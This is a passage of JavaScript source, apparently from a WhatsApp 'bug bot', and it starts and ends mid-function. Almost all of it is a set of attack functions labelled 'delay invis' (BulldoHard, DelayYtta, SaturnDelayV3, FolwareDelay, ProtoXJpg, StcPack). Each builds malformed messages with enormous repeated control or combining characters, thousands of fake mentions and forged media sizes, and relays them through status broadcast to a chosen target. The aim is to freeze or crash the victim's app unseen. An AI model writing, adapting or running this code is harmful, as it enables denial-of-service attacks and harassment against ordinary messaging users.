            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
   } catch (err) {
      console.error(err);
   }
};


//═══════════//═════════⧼⧼FUNGSI DELAY INVIS⧽⧽═════════//═══════════//
async function BulldoHard(sock, target) {
    const stickerMsg = {
  message: {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/d/f/A1B2C3D4E5F6G7H8I9J0.webp?ccb=11-4",
      mimetype: "image/webp",
      fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
      fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
      mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
      fileLength: 1173741,
      mediaKeyTimestamp: Date.now(),
      isAnimated: false,
      directPath: "/v/t62.7118-24/sample_sticker.enc",
      contextInfo: {
        mentionedJid: [
          target,
          ...Array.from({ length: 1995 }, () =>
            "92" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
          ),
        ],
        participant: target,
        remoteJid: "status@broadcast",
      },
    },
  },
};

const msg = generateWAMessageFromContent(target, stickerMsg.message, {});

await sock.relayMessage("status@broadcast", msg.message, {
  messageId: msg.key.id,
  statusJidList: [target],
  additionalNodes: [
    {
      tag: "meta",
      attrs: {},
      content: [
        {
          tag: "mentioned_users",
          attrs: {},
          content: [
            {
              tag: "to",
              attrs: { jid: target },
              content: []
            },
          ],
        },
      ],
    },
  ],
});
}


//═══════════//═════════⧼⧼FUNGSI DELAY INVIS⧽⧽═════════//═══════════//
async function DelayYtta(target, mention) {
  const Mention = [
    "0@s.whatsapp.net",
    ...Array.from(
      { length: 1990 },
      () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
    ),
  ];
  
  const message1 = {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          caption: "\u0000",
          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
          fileLength: "19769",
          height: 354,
          width: 783,
          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
          directPath:
            "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: "1743225419",
          jpegThumbnail: null,
          scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
          scanLengths: [2437, 17332],
          contextInfo: {
            participant: target,
            mentionedJid: Mention,
            isSampled: true,
            remoteJid: "status@broadcast",
            forwardingScore: 100,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363321780349272@newsletter",
              serverMessageId: 1,
              newsletterName: "ោ៝".repeat(10000)
            },
          },
        },
      },
    },
  };
  
  const message2 = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            remoteJid: "X",
            participant: target,
            stanzaId: "1234567890ABCDEF",
            mentionedJid: Mention,
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "\u0000",
                      format: "DEFAULT",
                    },
                    nativeFlowResponseMessage: {
                      name: "call_permission_request",
                      paramsJson: "\×10".repeat(25000),
                      version: 3,
                    },
                  },
                },
              },
            },
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };
  
  const message3 = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "",
            locationMessage: {
              degreesLatitude: 0,
              degreesLongtitude: 0,
            },
            hasMediaAttachment: true,
          },
          body: {
            text: "\u0000",
          },
          nativeFlowMessage: {
            messageParamJson: "{".repeat(10000),
          },
          contextInfo: {
            participant: target,
            mentionedJid: Mention,
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now(),
              },
            },
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
          },
        },
      },
    },
  };
  
  const msg = generateWAMessageFromContent(target, message1, message2, message3, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  if (mention) {
    await sock.relayMessage(
      target, 
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      }, 
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: " 🦠 ☇  𝐃𝐫𝐲𝐳𝐱 ˚𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮𝐮 !!! "
            },
            content: undefined
          }
        ]
      }
    );
  }
}


//═══════════//═════════⧼⧼FUNGSI DELAY INVIS⧽⧽═════════//═══════════//
async function SaturnDelayV3(target) {
    let permissionX = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "☇ 𝐃𝐫𝐲𝐳𝐱 ˚𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮 ",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_message",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
                "#" +
                Math.floor(Math.random() * 16777215)
                    .toString(16)
                    .padStart(6, "99999999"),
        }
    );
    
    let permissionY = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "🦠 ☇  𝐃𝐫𝐲𝐳𝐱 ˚𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮𝐮 !!!",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_request",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
               "#" +
               Math.floor(Math.random() * 16777215)
               .toString(16)
               .padStart(6, "99999999"),
        }
    );    

    await sock.relayMessage(
        "status@broadcast",
        permissionX.message,
        {
            messageId: permissionX.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                },
                            ],
                        },
                    ],
                },
            ],
        }
    );
    
    await sock.relayMessage(
        "status@broadcast",
        permissionY.message,
        {
            messageId: permissionY.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                },
                            ],
                        },
                    ],
                },
            ],
        }
    );    
}


//═══════════//═════════⧼⧼FUNGSI DELAY INVIS⧽⧽═════════//═══════════//
async function FolwareDelay(target, mention) {
  for (let i = 0; i < 1; i++) {
    const delaymention = Array.from({ length: 1500 }, (_, r) => ({
      title: "᭡꧈".repeat(95000),
      rows: [{ title: `${r + 1}`, id: `${r + 1}` }],
    }));

    let BIJI1 = {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            contextInfo: {
              remoteJid: "X",
              participant: "0@s.whatsapp.net",
              stanzaId: "1234567890ABCDEF",
              mentionedJid: [
                "6285215587498@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
                ),
              ],
              groupMentions: [],
              entryPointConversionSource: "non_contact",
              entryPointConversionApp: "whatsapp",
              entryPointConversionDelaySeconds: 467593,
            },
            stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
            isAvatar: false,
            isAiSticker: false,
            isLottie: false,
          },
        },
      },
    };

    const BIJI2 = {
      viewOnceMessage: {
        message: {
          listResponseMessage: {
            title: "🦠 ☇  𝐃𝐫𝐲𝐳𝐱 ˚𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮𝐮 !!!",
            listType: 2,
            buttonText: null,
            sections: delaymention,
            singleSelectReply: { selectedRowId: "🔴" },
            contextInfo: {
              mentionedJid: Array.from(
                { length: 30000 },
                () => "5" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
              participant: target,
              remoteJid: "status@broadcast",
              forwardingScore: 9741,
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "333333333333@newsletter",
                serverMessageId: 1,
                newsletterName: "-",
              },
            },
            description: "No Caption",
          },
        },
      },
      contextInfo: {
        channelMessage: true,
        statusAttributionType: 2,
      },
    };

    const AudioVs = {
      message: {
        ephemeralMessage: {
          message: {
            audioMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
              mimetype: "audio/mpeg",
              fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
              fileLength: 99999999999999,
              seconds: 99999999999999,
              ptt: true,
              mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
              fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
              directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
              mediaKeyTimestamp: 99999999999999,
              contextInfo: {
                mentionedJid: [
                  "@s.whatsapp.net",
                  ...Array.from({ length: 1900 }, () =>
                    `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                  ),
                ],
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "120363375427625764@newsletter",
                  serverMessageId: 1,
                  newsletterName: "🦠 ☇  𝐃𝐫𝐲𝐳𝐱 ˚𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮𝐮 !!!",
                },
              },
              waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==",
            },
          },
        },
      },
    };

    const msg = generateWAMessageFromContent(target, AudioVs.message, { userJid: target });
    const msg1 = generateWAMessageFromContent(target, BIJI1, {});

    await sock.relayMessage("status@broadcast", msg1.message, {
      messageId: msg1.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
            },
          ],
        },
      ],
    });

    const msg2 = generateWAMessageFromContent(target, BIJI2, {});

    await sock.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
            },
          ],
        },
      ],
    });

    if (mention) {
      await sock.relayMessage(
        target,
        {
          statusMentionMessage: {
            message: { protocolMessage: { key: msg.key, type: 25 } },
          },
        },
        {
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "🦠 ☇  𝐃𝐫𝐲𝐳𝐱 ˚𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮𝐮 !!!" },
              content: undefined,
            },
          ],
        }
      );
    }
    await new Promise((resolve) => setTimeout(resolve, 250));
  }
}


//═══════════//═════════⧼⧼FUNGSI DELAY INVIS⧽⧽═════════//═══════════//
async function ProtoXJpg(target) {
    const a = fs.readFileSync("./ストレージ/Bugs.jpg");
    const b = await prepareWAMessageMedia(
        { image: a },
        { upload: sock.waUploadToServer }
    );
    const msg = await generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    imageMessage: b.imageMessage,
                    extendedTextMessage: {
                        text: "᬴".repeat(25000) + "ꦽ".repeat(25000),
                        title: "᬴".repeat(25000) + "ꦽ".repeat(25000),
                        description: "᬴".repeat(25000) + "ꦽ".repeat(25000),
                        jpegThumbnail: a,
                        previewType: "PHOTO",
                        contextInfo: {
                            isForwarded: true,
                            forwardingScore: 9999,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
                            ],
                            participant: "0@s.whatsapp.net",
                            remoteJid: "status@broadcast",
                            externalAdReply: {
                                title: "᬴".repeat(40000),
                                body: "᬴".repeat(40000),
                                thumbnailUrl: DragonImg,
                                sourceUrl: "https://t.me/DryzxModders",
                                mediaType: 1
                            }
                        }
                    }
                }
            }
        }, {});
    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    })
};


//═══════════//═════════⧼⧼FUNGSI DELAY INVIS⧽⧽═════════//═══════════//
async function StcPack(sock, target) {
  try {
    const stickerMsg = {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_573578875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/webp",
            fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
            fileLength: "1173741824",
            mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
            fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
            directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
            mediaKeyTimestamp: "1743225419",
            isAnimated: false,
            viewOnce: false,
          },
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
            fileLength: "99999999",
            seconds: 9999,
            ptt: true,
            streamingSidecar: "AAAA",
            mediaKeyTimestamp: "1743848703",
            contextInfo: {
              mentionedJid: [
                target,
                ...Array.from({ length: 1900 }, () =>
                  "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"
                )
              ],
              forwardingScore: 9999,
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363375427625764@newsletter",
                serverMessageId: 1,
                newsletterName: "🎵"
              }
            }
          },
          contextInfo: {
            ephemeralExpiration: 0,
            forwardingScore: 999,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
              "#" +
              Math.floor(Math.random() * 0xffffff)
                .toString(16)
                .padStart(6, "0"),
            mentionedJid: [
              target,
              ...Array.from({ length: 1900 }, () =>
                "92" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              )
            ],
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9999,
            isForwarded: true,
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: { text: "mexxtryhard!!?", format: "DEFAULT" },
                    nativeFlowMessage: {
                      buttons: [
                        {
                          name: "single_select",
                          buttonParamsJson: "\x10".repeat(5000)
                        },
                        {
                          name: "call_permission_request",
                          buttonParamsJson: "ោ៝".repeat(13000)
                        },
                        {
                          name: "carousel_message",
                          buttonParamsJson:
                            "\x10".repeat(5000) + "ោ៝".repeat(6000)
                        }
                      ],
                      messageParamsJson: "ោ៝".repeat(1000),
                      version: 3
                    }
                  }
                }
              }
            }
          }
        }
      }
    };

    const stickerMsgLite = {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_573578875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/webp",
